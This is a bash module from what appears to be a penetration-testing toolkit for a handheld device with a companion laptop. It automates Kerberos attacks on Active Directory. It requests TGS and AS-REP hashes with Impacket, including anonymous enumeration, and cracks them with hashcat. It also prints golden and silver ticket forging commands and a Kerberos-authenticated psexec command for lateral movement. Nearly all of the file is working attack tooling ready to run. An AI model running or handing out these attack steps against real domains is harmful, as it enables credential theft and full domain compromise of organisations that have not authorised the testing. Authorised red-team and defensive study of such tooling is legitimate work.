#!/bin/bash
# Kerberos attacks - Kerberoasting and AS-REP roasting

rt_kerberos() {
  local choice
  choice=$(menu_pick "Kerberos Attacks" \
    "Kerberoast (get TGS hashes)" \
    "AS-REP Roast (no preauth)" \
    "Enumerate SPNs" \
    "Crack Kerberos Hashes" \
    "Golden/Silver Ticket Info")
  
  case "$choice" in
    1) kerb_roast ;;
    2) kerb_asrep ;;
    3) kerb_enum_spn ;;
    4) kerb_crack ;;
    5) kerb_ticket_info ;;
    0|"") return ;;
  esac
}

kerb_roast() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "Kerberoasting requires laptop mode (Impacket)"
    return 1
  fi
  
  local dc_ip
  dc_ip=$(IP_PICKER "Domain Controller IP" "")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local domain
  domain=$(TEXT_PICKER "Domain" "corp.local")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local username
  username=$(TEXT_PICKER "Username (any domain user)" "user")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local password
  password=$(TEXT_PICKER "Password" "")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Kerberoasting - requesting TGS tickets for SPNs..."
  
  local outfile="$LAPTOP_RESULTS_DIR/kerberoast_$(date +%Y%m%d_%H%M%S).txt"
  
  laptop_exec "GetUserSPNs.py '$domain/$username:$password' -dc-ip '$dc_ip' -request -outputfile '$outfile'" 2>&1 | \
    tee "$ARTIFACT_DIR/kerberoast_output.txt"
  
  LOG ""
  LOG green "TGS hashes saved to: $outfile"
  LOG ""
  LOG "Crack with hashcat:"
  LOG "  hashcat -m 13100 $outfile wordlist.txt"
  LOG "  hashcat -m 13100 $outfile wordlist.txt -r rules/best64.rule"
}

kerb_asrep() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "AS-REP roasting requires laptop mode"
    return 1
  fi
  
  local dc_ip
  dc_ip=$(IP_PICKER "Domain Controller IP" "")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local domain
  domain=$(TEXT_PICKER "Domain" "corp.local")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local method
  method=$(menu_pick "User enumeration method" \
    "Single username" \
    "Username list file" \
    "No credentials (anonymous)")
  
  local outfile="$LAPTOP_RESULTS_DIR/asrep_$(date +%Y%m%d_%H%M%S).txt"
  
  case "$method" in
    1)
      local username
      username=$(TEXT_PICKER "Username to test" "")
      case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
      
      LOG blue "Testing $username for AS-REP roastability..."
      laptop_exec "GetNPUsers.py '$domain/' -usersfile <(echo '$username') -dc-ip '$dc_ip' -format hashcat -outputfile '$outfile'" 2>&1
      ;;
    2)
      local userlist
      userlist=$(TEXT_PICKER "User list file (on laptop)" "/tmp/users.txt")
      case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
      
      LOG blue "Testing users from $userlist..."
      laptop_exec "GetNPUsers.py '$domain/' -usersfile '$userlist' -dc-ip '$dc_ip' -format hashcat -outputfile '$outfile'" 2>&1
      ;;
    3)
      LOG blue "Attempting anonymous enumeration..."
      laptop_exec "GetNPUsers.py '$domain/' -dc-ip '$dc_ip' -format hashcat -outputfile '$outfile'" 2>&1
      ;;
    0|"") return ;;
  esac
  
  LOG ""
  LOG "AS-REP hashes saved to: $outfile"
  LOG ""
  LOG "Crack with hashcat:"
  LOG "  hashcat -m 18200 $outfile wordlist.txt"
}

kerb_enum_spn() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "SPN enumeration requires laptop mode"
    return 1
  fi
  
  local dc_ip
  dc_ip=$(IP_PICKER "Domain Controller IP" "")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local domain
  domain=$(TEXT_PICKER "Domain" "corp.local")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local username
  username=$(TEXT_PICKER "Username" "user")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local password
  password=$(TEXT_PICKER "Password" "")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Enumerating Service Principal Names..."
  
  ensure_dir "$ARTIFACT_DIR"
  
  laptop_exec "GetUserSPNs.py '$domain/$username:$password' -dc-ip '$dc_ip'" 2>&1 | \
    tee "$ARTIFACT_DIR/spn_enum_$(ts).txt"
  
  LOG ""
  LOG "Look for service accounts with SPNs - these are Kerberoastable"
}

kerb_crack() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "Cracking requires laptop mode"
    return 1
  fi
  
  local hash_type
  hash_type=$(menu_pick "Hash Type" \
    "Kerberoast (TGS-REP - 13100)" \
    "AS-REP (18200)")
  
  local mode
  case "$hash_type" in
    1) mode=13100 ;;
    2) mode=18200 ;;
    0|"") return ;;
  esac
  
  local hash_file
  hash_file=$(TEXT_PICKER "Hash file" "$LAPTOP_RESULTS_DIR/kerberoast.txt")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local wordlist
  wordlist=$(TEXT_PICKER "Wordlist" "/usr/share/wordlists/rockyou.txt")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting hashcat for Kerberos hashes..."
  
  laptop_exec_bg "hashcat -m $mode -a 0 '$hash_file' '$wordlist' --status -o '$LAPTOP_RESULTS_DIR/kerb_cracked.txt'" \
    "$LAPTOP_RESULTS_DIR/hashcat_kerb.log"
  
  LOG green "Hashcat started"
  LOG "Monitor with: tail -f $LAPTOP_RESULTS_DIR/hashcat_kerb.log"
}

kerb_ticket_info() {
  LOG blue "=== Kerberos Ticket Attacks ==="
  LOG ""
  LOG "GOLDEN TICKET (krbtgt hash required)"
  LOG "  - Forge TGT for any user"
  LOG "  - Domain-wide access"
  LOG "  - Valid until krbtgt password reset (twice)"
  LOG ""
  LOG "  ticketer.py -nthash <krbtgt_hash> -domain-sid <SID> \\"
  LOG "    -domain corp.local administrator"
  LOG ""
  LOG "SILVER TICKET (service account hash required)"
  LOG "  - Forge TGS for specific service"
  LOG "  - Limited to that service"
  LOG "  - Doesn't touch DC"
  LOG ""
  LOG "  ticketer.py -nthash <service_hash> -domain-sid <SID> \\"
  LOG "    -domain corp.local -spn cifs/server.corp.local user"
  LOG ""
  LOG "Get domain SID with:"
  LOG "  lookupsid.py domain/user:pass@dc-ip"
  LOG ""
  LOG "Use ticket:"
  LOG "  export KRB5CCNAME=/path/to/ticket.ccache"
  LOG "  psexec.py -k -no-pass corp.local/administrator@target"
  
  PROMPT "Press button to continue"
}
